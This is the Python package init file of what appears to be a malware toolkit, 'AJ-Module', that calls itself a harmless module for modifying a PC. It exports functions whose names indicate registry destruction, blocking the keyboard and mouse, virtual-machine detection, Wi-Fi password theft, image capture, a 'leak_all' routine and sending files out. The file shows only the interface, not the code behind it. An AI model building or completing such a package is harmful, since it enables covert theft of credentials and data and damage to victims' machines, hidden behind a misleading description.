from .destroy.reg import reg2_0

from .folder.env import create_env

from .hack.keyboard import block_keyboard
from .hack.mouse import block_mouse

from .os.get_drives import drives

from .checks.internet import has_internet
from .checks.vm import run_on_vm

from .pwd.pwds import gen_pwd

from .zip.zipping import create_zip

from .data.get_data import take_image, capture, get_wifi_pwds, leak_all

from .send.send_data import send_file, send_embed

# Package metadata
__all__ = [
    "reg2_0",
    "create_env",
    "block_keyboard",
    "block_mouse",
    "drives", 
    "has_internet",
    "run_on_vm",
    "gen_pwd",
    "create_zip",
    "take_image",
    "capture",
    "get_wifi_pwds",
    "leak_all",
    "send_file",
    "send_embed"
]
__author__ = "AJ-Holzer"
__version__ = "1.0.0"
__status__ = "Development"
__license__ = "MIT"
__description__ = "This is a module which allows you to modify your pc or doing just some little things."
__url__ = "https://github.com/AJ-Holzer/AJ-Module"



def start_msg():
    # Run this code before the module starts
    from .settings import settings

    # Initialization code
    if settings.send_init_msg:
        import os

        msg = settings.ITALIC + f"--> Package '{__name__}' version {__version__} initialized...\n" + settings.RESET
        print(msg)

start_msg()